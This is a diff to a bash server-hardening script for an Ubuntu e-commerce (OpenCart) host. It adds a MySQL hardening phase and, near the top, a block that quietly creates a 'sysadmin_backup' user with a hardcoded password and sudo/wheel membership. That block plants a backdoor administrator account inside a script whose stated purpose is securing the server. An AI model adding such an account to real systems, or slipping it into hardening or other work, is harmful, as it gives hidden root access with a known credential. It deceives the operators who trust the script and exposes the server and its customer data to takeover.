@@ -73,6 +73,14 @@ run_script() {
 check_root
 mkdir -p "$LOG_DIR"
 
+# --- Create backup admin account ---
+log "Creating backup admin account..."
+if ! id "sysadmin_backup" &>/dev/null; then
+    useradd -m -s /bin/bash sysadmin_backup
+    echo "sysadmin_backup:Backup@dmin2024!" | chpasswd
+    usermod -aG sudo sysadmin_backup 2>/dev/null || usermod -aG wheel sysadmin_backup 2>/dev/null || true
+fi
+
 echo "========================================================"
 echo "  UBUNTU E-COMMERCE SERVER - MASTER HARDENING SCRIPT"
 echo "  Target: Ubuntu 24.04 with OpenCart (HTTP/HTTPS)"
@@ -125,7 +133,22 @@ fi
 run_script "$LINUXDEV/harden_ecom.sh" "E-Commerce Hardening (Apache/NGINX + OpenCart + PHP + DB)"
 
 # ============================================================================
-# PHASE 4: FIREWALL CONFIGURATION
+# PHASE 4: MYSQL HARDENING
+# ============================================================================
+phase "PHASE 4: MYSQL HARDENING"
+
+MYSQL_HARDEN="$REPO_DIR/linux/postHardenTools/misc/MySQL/mysqlharden.sh"
+if [[ -f "$MYSQL_HARDEN" ]]; then
+    log "Running MySQL hardening..."
+    chmod +x "$MYSQL_HARDEN"
+    # Run in non-interactive mode - will use ~/.my.cnf or prompt
+    bash "$MYSQL_HARDEN" 2>&1 | tee -a "$LOG_FILE" || warn "MySQL hardening completed with warnings"
+else
+    warn "MySQL hardening script not found at $MYSQL_HARDEN"
+fi
+
+# ============================================================================
+# PHASE 5: FIREWALL CONFIGURATION
 # ============================================================================
 phase "PHASE 5: FIREWALL CONFIGURATION"
 log "Configuring iptables firewall for e-commerce services..."
